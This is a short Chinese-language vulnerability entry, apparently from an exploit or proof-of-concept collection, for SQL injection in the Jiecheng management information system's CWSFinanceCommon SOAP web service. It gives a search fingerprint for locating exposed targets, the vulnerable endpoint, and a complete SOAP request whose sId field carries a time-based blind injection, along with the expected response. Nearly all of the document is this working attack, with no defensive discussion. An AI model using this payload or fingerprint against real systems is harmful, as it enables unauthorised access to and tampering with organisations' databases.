# 捷诚管理信息系统CWSFinanceCommonSQL注入漏洞

捷诚管理信息系统CWSFinanceCommon ｜ SQL注入 ｜ —
- **指纹**：`body="/Scripts/EnjoyMsg.js"`
- **请求**：`POST /EnjoyRMIS_WS/WS/APS/CWSFinanceCommon.asmx HTTP/1.1`

**Payload**
```
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<GetOSpById xmlns="http://tempuri.org/">
<sId>1';waitfor delay '0:0:5'--+</sId>
</GetOSpById>
</soap:Body>
</soap:Envelope>
```
- **响应特征**：200